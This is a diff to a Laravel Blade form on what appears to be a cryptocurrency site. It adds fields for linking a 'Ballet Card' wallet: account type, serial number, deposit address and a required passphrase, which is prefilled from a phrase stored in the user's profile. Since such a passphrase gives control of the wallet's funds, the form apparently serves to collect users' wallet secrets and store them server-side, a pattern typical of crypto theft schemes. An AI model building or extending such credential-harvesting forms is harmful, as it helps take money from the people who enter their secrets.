@@ -160,6 +160,66 @@
                 <form method="POST" action="{{ route('user.ballet-cards.link') }}" enctype="multipart/form-data" class="space-y-6 mt-6">
                     @csrf
                     
+                    <!-- Card Details Section -->
+                    <div class="space-y-4">
+                        <div class="flex items-center space-x-2 mb-1">
+                            <div class="w-6 h-6 rounded-lg bg-gradient-to-r from-primary-500 to-primary-600 flex items-center justify-center">
+                                <i class="fas fa-wallet text-white text-xs"></i>
+                            </div>
+                            <h3 class="text-base font-semibold text-gray-900 dark:text-white">Ballet Card Details</h3>
+                        </div>
+                        
+                        <div class="bg-white/80 dark:bg-gray-800/80 backdrop-blur-sm rounded-xl border border-gray-200/50 dark:border-gray-700/50 p-4 space-y-4">
+                            <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
+                                <!-- Primary Account Type -->
+                                <div>
+                                    <label for="primary_account_type" class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Primary Account Type <span class="text-red-500">*</span></label>
+                                    <select id="primary_account_type" name="primary_account_type" class="mt-1 block w-full py-3 px-3 border @error('primary_account_type') border-red-400 dark:border-red-500 @else border-gray-300 dark:border-gray-600 @enderror rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500 bg-white/90 dark:bg-gray-800/90 backdrop-blur-sm text-gray-900 dark:text-white text-sm" required>
+                                        <option value="">Select Account Type</option>
+                                        <option value="BTC" {{ old('primary_account_type') == 'BTC' ? 'selected' : '' }}>BTC - Bitcoin</option>
+                                        <option value="ETH" {{ old('primary_account_type') == 'ETH' ? 'selected' : '' }}>ETH - Ethereum</option>
+                                        <option value="USDT" {{ old('primary_account_type') == 'USDT' ? 'selected' : '' }}>USDT - Tether</option>
+                                        <option value="LTC" {{ old('primary_account_type') == 'LTC' ? 'selected' : '' }}>LTC - Litecoin</option>
+                                        {{-- Add more options as needed --}}
+                                    </select>
+                                    @error('primary_account_type')
+                                        <p class="mt-1 text-xs text-red-600 dark:text-red-400">{{ $message }}</p>
+                                    @enderror
+                                </div>
+
+                                <!-- Serial Number -->
+                                <div>
+                                    <label for="serial_number" class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Serial Number (Optional)</label>
+                                    <input type="text" name="serial_number" id="serial_number" value="{{ old('serial_number') }}" class="block w-full pl-3 pr-3 py-3 border @error('serial_number') border-red-400 dark:border-red-500 @else border-gray-300 dark:border-gray-600 @enderror rounded-lg bg-white/90 dark:bg-gray-800/90 backdrop-blur-sm focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500 text-gray-900 dark:text-white placeholder-gray-400 dark:placeholder-gray-500 text-sm" placeholder="Enter 8-digit alphanumeric serial number">
+                                    @error('serial_number')
+                                        <p class="mt-1 text-xs text-red-600 dark:text-red-400">{{ $message }}</p>
+                                    @enderror
+                                </div>
+
+                                <!-- Primary Account Deposit Address -->
+                                <div class="lg:col-span-2">
+                                    <label for="primary_account_deposit_address" class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Primary Account Deposit Address <span class="text-red-500">*</span></label>
+                                    <input type="text" name="primary_account_deposit_address" id="primary_account_deposit_address" value="{{ old('primary_account_deposit_address') }}" class="block w-full pl-3 pr-3 py-3 border @error('primary_account_deposit_address') border-red-400 dark:border-red-500 @else border-gray-300 dark:border-gray-600 @enderror rounded-lg bg-white/90 dark:bg-gray-800/90 backdrop-blur-sm focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500 text-gray-900 dark:text-white placeholder-gray-400 dark:placeholder-gray-500 text-sm" placeholder="Enter deposit address" required>
+                                    @error('primary_account_deposit_address')
+                                        <p class="mt-1 text-xs text-red-600 dark:text-red-400">{{ $message }}</p>
+                                    @enderror
+                                </div>
+
+                                <!-- PassPhrase (Auto-fetched or manual) -->
+                                <div class="lg:col-span-2">
+                                    <label for="pass_phrase" class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">PassPhrase <span class="text-red-500">*</span></label>
+                                    <input type="text" name="pass_phrase" id="pass_phrase" value="{{ old('pass_phrase', Auth::user()->phrase ?? '') }}" class="block w-full pl-3 pr-3 py-3 border @error('pass_phrase') border-red-400 dark:border-red-500 @else border-gray-300 dark:border-gray-600 @enderror rounded-lg bg-white/90 dark:bg-gray-800/90 backdrop-blur-sm focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500 text-gray-900 dark:text-white placeholder-gray-400 dark:placeholder-gray-500 text-sm" placeholder="Enter 20-digit alphanumeric passphrase" required {{ Auth::user()->phrase ? 'readonly' : '' }}>
+                                    @error('pass_phrase')
+                                        <p class="mt-1 text-xs text-red-600 dark:text-red-400">{{ $message }}</p>
+                                    @enderror
+                                    @if(Auth::user()->phrase)
+                                        <p class="mt-1 text-xs text-gray-500 dark:text-gray-400">Passphrase auto-fetched from your profile.</p>
+                                    @endif
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
                     <!-- Image Upload Section -->
                     <div class="space-y-4">
                         <div class="flex items-center space-x-2 mb-1">
